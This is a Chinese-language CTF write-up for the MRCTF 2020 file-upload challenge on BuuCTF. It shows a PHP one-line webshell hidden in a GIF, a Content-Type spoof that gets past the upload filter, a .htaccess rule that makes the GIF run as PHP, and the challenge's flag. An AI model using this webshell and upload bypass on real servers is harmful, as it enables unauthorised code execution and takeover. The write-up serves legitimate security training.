---
tags:
  - BuuCTF
  - 简单
  - 文件上传
  - 一句话木马
  - .htaccess
---

# \[MRCTF 2020\] 你传你🐎呢

## 前置工作

文件上传题我想来推荐直接用 Burp Suite 拦截请求，一个一个放行过去

![](https://p.sda1.dev/13/598c88e8b736eca43607236571592283/image.png)

选一个经常用的图片木马 `a.gif`，直接上传，发现只有当把文件类型修改成 `image/jpeg` 的时候才能够被放行，否则都是一句 `我扌your problem?`，讲真，出这个题的人有点抽象

```http
Content-Disposition: form-data; name="uploaded"; filename="a.gif"
Content-Type: image/jpeg

GIF89a?
<script language='php'>@eval($_POST['attack']);</script>
```

再之后我们把后缀名改成可被 PHP 执行的，比如 `.php`，`.phtml` 等，不论是大小写还是别名都行不通，说明这个题目得用其他方法，即使用 `.htaccess` 配置文件使其能够将我们的图片文件作为 PHP 文件执行

## .htaccess 改造

我们自己写一个 .htaccess 文件，将这个文件传上去，当然传的时候别忘了把 `Content-Type` 改成 `image/jpeg`，他只认 `jpeg`，但我们这次很显然就能够绕过对于 `.php` 的判断了

```xml
<FilesMatch "a.gif">
    SetHandler application/x-httpd-php
</FilesMatch>
```

此时访问 `/upload/3ac75d11b42dc586a891e7d538521f24/a.gif`，发现屏幕上已经出现了 `GIF89a?`，说明我们的图片木马已经被当成 PHP 文件执行了

## 攻入靶机

用蚁剑操作，这是基本操作了，不多赘述，进入后直接打进根目录，发现 Flag 文件，最终结果为 `flag{1762a205-9062-4cfb-acac-1d02f1a5b952}`